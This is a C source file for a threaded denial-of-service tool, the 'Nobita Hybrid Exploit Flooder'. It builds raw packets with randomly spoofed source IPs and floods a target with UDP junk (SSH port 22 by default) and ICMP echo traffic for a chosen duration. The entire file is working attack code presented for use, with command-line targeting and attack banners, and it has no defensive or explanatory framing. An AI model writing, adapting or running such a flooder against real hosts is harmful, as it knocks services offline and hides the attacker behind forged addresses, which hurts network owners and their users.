#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>

// Packet size for UDP
#define PACKET_SIZE 8192
#define THREADS 10

struct ipheader {
    unsigned char  iph_ihl:4, iph_ver:4;
    unsigned char  iph_tos;
    unsigned short iph_len;
    unsigned short iph_ident;
    unsigned short iph_offset;
    unsigned char  iph_ttl;
    unsigned char  iph_protocol;
    unsigned short iph_chksum;
    unsigned int   iph_source;
    unsigned int   iph_dest;
};

struct udpheader {
    unsigned short udph_srcport;
    unsigned short udph_destport;
    unsigned short udph_len;
    unsigned short udph_chksum;
};

struct pseudo_udp {
    unsigned int src_addr;
    unsigned int dst_addr;
    unsigned char zero;
    unsigned char protocol;
    unsigned short length;
};

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    for (; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void random_ip(char *ip) {
    sprintf(ip, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);
}

// ICMP Flood function
void icmp_flood(const char *target, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("ICMP socket");
        exit(1);
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = 0;
    sin.sin_addr.s_addr = inet_addr(target);

    char packet[PACKET_SIZE];
    struct ipheader *ip = (struct ipheader *)packet;
    struct icmp *icmp_pkt = (struct icmp *)(packet + sizeof(struct ipheader));

    time_t start = time(NULL);

    while ((time(NULL) - start) < duration) {
        memset(packet, 0, PACKET_SIZE);

        // Fill ICMP Header
        icmp_pkt->icmp_type = ICMP_ECHO;
        icmp_pkt->icmp_code = 0;
        icmp_pkt->icmp_id = rand();
        icmp_pkt->icmp_seq = rand();
        icmp_pkt->icmp_cksum = 0;

        // Randomize the ICMP checksum
        icmp_pkt->icmp_cksum = checksum((unsigned short *)icmp_pkt, sizeof(struct icmp));

        // Random Spoofed Source IP
        char spoof_ip[16];
        random_ip(spoof_ip);

        ip->iph_ver = 4;
        ip->iph_ihl = 5;
        ip->iph_tos = 0;
        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmp));
        ip->iph_ident = htons(rand() % 65535);
        ip->iph_offset = 0;
        ip->iph_ttl = 255;
        ip->iph_protocol = IPPROTO_ICMP;
        ip->iph_source = inet_addr(spoof_ip);
        ip->iph_dest = sin.sin_addr.s_addr;
        ip->iph_chksum = checksum((unsigned short *)packet, sizeof(struct ipheader));

        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct icmp), 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
}

// UDP Flood function (Targeting SSH Port 22)
void udp_flood(const char *target, int port, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("UDP socket");
        exit(1);
    }

    int one = 1;
    const int *val = &one;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target);

    char packet[PACKET_SIZE];

    time_t start = time(NULL);

    while ((time(NULL) - start) < duration) {
        memset(packet, 0, PACKET_SIZE);

        struct ipheader *ip = (struct ipheader *)packet;
        struct udpheader *udp = (struct udpheader *)(packet + sizeof(struct ipheader));
        char *data = packet + sizeof(struct ipheader) + sizeof(struct udpheader);

        // Fill payload with junk
        for (int i = 0; i < 512; i++) {
            data[i] = rand() % 255;
        }

        int data_len = 512;

        // Spoofed Source IP
        char spoof_ip[16];
        random_ip(spoof_ip);

        ip->iph_ver = 4;
        ip->iph_ihl = 5;
        ip->iph_tos = 0;
        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct udpheader) + data_len);
        ip->iph_ident = htons(rand() % 65535);
        ip->iph_offset = 0;
        ip->iph_ttl = 255;
        ip->iph_protocol = IPPROTO_UDP;
        ip->iph_source = inet_addr(spoof_ip);
        ip->iph_dest = sin.sin_addr.s_addr;
        ip->iph_chksum = checksum((unsigned short *)packet, sizeof(struct ipheader));

        udp->udph_srcport = htons(rand() % 65535);
        udp->udph_destport = htons(port);  // Target SSH Port 22 or Custom port
        udp->udph_len = htons(sizeof(struct udpheader) + data_len);
        udp->udph_chksum = 0;

        struct pseudo_udp psh;
        psh.src_addr = ip->iph_source;
        psh.dst_addr = ip->iph_dest;
        psh.zero = 0;
        psh.protocol = IPPROTO_UDP;
        psh.length = udp->udph_len;

        char pseudo_packet[sizeof(struct pseudo_udp) + sizeof(struct udpheader) + data_len];
        memcpy(pseudo_packet, &psh, sizeof(struct pseudo_udp));
        memcpy(pseudo_packet + sizeof(struct pseudo_udp), udp, sizeof(struct udpheader) + data_len);

        udp->udph_chksum = checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));

        sendto(sock, packet, ntohs(ip->iph_len), 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
}

// Thread function to execute attacks
void *flooder(void *args) {
    char *target = ((char **)args)[0];
    int port = atoi(((char **)args)[1]);
    int duration = atoi(((char **)args)[2]);
    
    udp_flood(target, port, duration);
    icmp_flood(target, duration);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <target IP> <port (22 for SSH)> <duration>\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    // Check if port is 22 (SSH Port)
    if (port == 22) {
        printf("⚡ Targeting SSH port (22)...\n");
    }

    pthread_t threads[THREADS];
    
    printf("🔥 Starting Nobita Hybrid Exploit Flooder (UDP + ICMP) 🔥\n");
    printf("🎯 Target: %s | Port: %d | Duration: %ds\n", target, port, duration);
    
    for (int i = 0; i < THREADS; i++) {
        char *args[] = { (char *)target, argv[2], argv[3] };
        pthread_create(&threads[i], NULL, flooder, args);
    }
    
    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("✅ Attack completed.\n");
    return 0;
}
